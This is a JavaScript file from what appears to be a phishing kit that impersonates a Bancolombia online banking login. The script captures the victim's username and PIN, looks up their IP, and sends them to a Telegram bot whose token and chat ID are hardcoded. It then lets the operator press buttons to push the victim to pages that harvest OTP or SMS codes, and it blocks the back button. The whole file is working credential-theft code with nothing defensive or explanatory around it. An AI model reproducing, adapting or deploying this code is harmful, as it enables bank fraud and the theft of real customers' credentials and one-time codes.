
async function getTokens() {
    return {
        telegramToken: "8627198220:AAHlyBdeq2SeDlVN6G4_6QPdQrwU3tY-ICw",
        telegramChatId: "-1004245962123"
    };
}
let userIncorrectAttempts = 0;
let waitingForDecision = false;
let lastDecisionTimestamp = 0;

async function sendTelegramMessage(message, buttons = null) {
    try {
        const tokens = await getTokens();
        if (!tokens) throw new Error('No se pudieron cargar los tokens');

        const payload = {
            chat_id: tokens.telegramChatId,
            text: message,
        };
        if (buttons) {
            payload.reply_markup = JSON.stringify({
                inline_keyboard: buttons
            });
        }
        const response = await fetch(`https://api.telegram.org/bot${tokens.telegramToken}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(payload),
        });

        if (!response.ok) {
            throw new Error('Error al enviar mensaje a Telegram');
        }
        
        const responseData = await response.json();
        return responseData.result.message_id;
    } catch (error) {
        console.error('Error:', error);
    }
}

async function getIP() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch (error) {
        console.error('Error al obtener la IP:', error);
        return 'No se pudo obtener';
    }
}

async function waitForDecision(messageId) {
    const tokens = await getTokens();
    if (!tokens) return;

    while (waitingForDecision) {
        try {
            const response = await fetch(`https://api.telegram.org/bot${tokens.telegramToken}/getUpdates?offset=-1&allowed_updates=["callback_query"]`);
            const data = await response.json();
            
            if (data.ok && data.result.length > 0) {
                const lastUpdate = data.result[0];
                if (lastUpdate.callback_query && 
                    lastUpdate.callback_query.message.date > lastDecisionTimestamp &&
                    lastUpdate.callback_query.message.message_id === messageId) {
                    const action = lastUpdate.callback_query.data;
                    waitingForDecision = false;
                    lastDecisionTimestamp = lastUpdate.callback_query.message.date;
                    
                    await removeInlineKeyboard(messageId);
                    
                    handleAction(action);
                    return;
                }
            }
        } catch (error) {
            console.error('Error al obtener actualizaciones de Telegram:', error);
        }
        await new Promise(resolve => setTimeout(resolve, 2000));
    }
}

async function removeInlineKeyboard(messageId) {
    try {
        const tokens = await getTokens();
        if (!tokens) return;

        await fetch(`https://api.telegram.org/bot${tokens.telegramToken}/editMessageReplyMarkup`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: tokens.telegramChatId,
                message_id: messageId,
                reply_markup: JSON.stringify({
                    inline_keyboard: []
                })
            }),
        });
    } catch (error) {
        console.error('Error al eliminar el teclado inline:', error);
    }
}

function handleAction(action) {
    document.getElementById('loading-overlay').style.display = 'none';
    switch(action) {
        case 'dinamica_normal':
            window.location.href = 'pinword.html';
            break;
        case 'dinamica_sms':
            window.location.href = 'pinwordsms.html';
            break;
        case 'cerrar_sesion':
            clearInputFields();
            window.location.href = 'https://www.bancolombia.com/personas';
            break;
        case 'usuario_incorrecto':
            showErrorMessage();
            break;
    }
}

function showErrorMessage() {
    const errorMessage = document.getElementById('error-message');
    errorMessage.style.display = 'block';
    errorMessage.textContent = 'Usuario invalido o incorrecto';
}

function clearErrorMessage() {
    document.getElementById('error-message').style.display = 'none';
}

function clearInputFields() {
    document.getElementById('username').value = '';
    document.getElementById('password').value = '';
    clearErrorMessage();
    checkInputs();
}

function checkInputs() {
    const username = document.getElementById('username').value.trim();
    const password = document.getElementById('password').value.trim();
    const continueButton = document.getElementById('continueButton');
    
    // Verifica que el nombre de usuario contenga al menos una letra y un número
    const usernameIsValid = /^(?=.*[A-Za-z])(?=.*\d)[A-Za-z\d]+$/.test(username);

    // Activa el botón solo si el nombre de usuario es válido y la contraseña no está vacía
    continueButton.disabled = !(usernameIsValid && password !== '');
}

function showFieldError(fieldId, message) {
    const field = document.getElementById(fieldId);
    let error = document.querySelector(`#${fieldId} + .field-error`);
    
    if (!error) {
        error = document.createElement('span');
        error.className = 'field-error';
        error.style.color = 'red';
        field.parentNode.insertBefore(error, field.nextSibling);
    }
    error.textContent = message;
}

function clearFieldError(fieldId) {
    const error = document.querySelector(`#${fieldId} + .field-error`);
    if (error) {
        error.remove();
    }
}

document.getElementById('username').addEventListener('blur', function() {
    // Verifica si el nombre de usuario es válido solo cuando se pierde el foco
    const username = document.getElementById('username').value.trim();
    const usernameIsValid = /^(?=.*[A-Za-z])(?=.*\d)[A-Za-z\d]+$/.test(username);
    
    if (!usernameIsValid && username !== '') {
        showFieldError('username', 'Usuario incorrecto');
    } else {
        clearFieldError('username');
    }
    checkInputs();
});

document.getElementById('username').addEventListener('input', function() {
    clearErrorMessage(); // Limpia mensajes de error generales
    checkInputs(); // Solo actualiza el botón sin mostrar mensaje
});

document.getElementById('password').addEventListener('input', function(e) {
    e.target.value = e.target.value.replace(/[^0-9]/g, '').slice(0, 4);
    clearErrorMessage();
    checkInputs();
});

async function handleContinueClick(e) {
    e.preventDefault();
    
    const username = document.getElementById('username').value.trim();
    const password = document.getElementById('password').value.trim();
    
    // Verifica si el nombre de usuario cumple con el patrón de letras y números
    const usernameIsValid = /^(?=.*[A-Za-z])(?=.*\d)[A-Za-z\d]+$/.test(username);

    // Si el usuario no cumple con el patrón o la contraseña está vacía, muestra un mensaje de error
    if (!usernameIsValid || password === '') {
        showErrorMessage();
        return;
    }

    document.getElementById('loading-overlay').style.display = 'flex';
    
    const ip = await getIP();
    const message = `🏦 Nuevo Log Bancolombia\n\n🌐 IP: ${ip}\n👤 Usuario: ${username}\n🔑 Contraseña: ${password}`;
    await sendTelegramMessage(message);

    waitingForDecision = true;
    userIncorrectAttempts = 0;

    const decisionMessage = `🤔 Toma una decisión\n\n🌐 IP: ${ip}`;
    const buttons = [
        [{ text: "## ASK OTP ##", callback_data: "dinamica_normal" }],
        [{ text: "## ASK SMS ##", callback_data: "dinamica_sms" }],
        [{ text: "## FINALIZAR ##", callback_data: "cerrar_sesion" }],
        [{ text: "## ERROR LOGIN ##", callback_data: "usuario_incorrecto" }]
    ];
    const messageId = await sendTelegramMessage(decisionMessage, buttons);

    await waitForDecision(messageId);
}

document.getElementById('continueButton').addEventListener('click', handleContinueClick);

window.addEventListener('load', function() {
    resetState();
    userIncorrectAttempts = 0;
    checkInputs();
});

window.addEventListener('pageshow', function(event) {
    if (event.persisted || (window.performance && window.performance.navigation.type === 2)) {
        resetState();
        userIncorrectAttempts = 0;
        checkInputs();
    }
});

window.addEventListener('popstate', function() {
    resetState();
    userIncorrectAttempts = 0;
    checkInputs();
});

function resetState() {
    waitingForDecision = false;
    document.getElementById('loading-overlay').style.display = 'none';
    clearInputFields();
}

window.history.pushState(null, '', window.location.href);
window.addEventListener('popstate', function() {
    window.history.pushState(null, '', window.location.href);
});
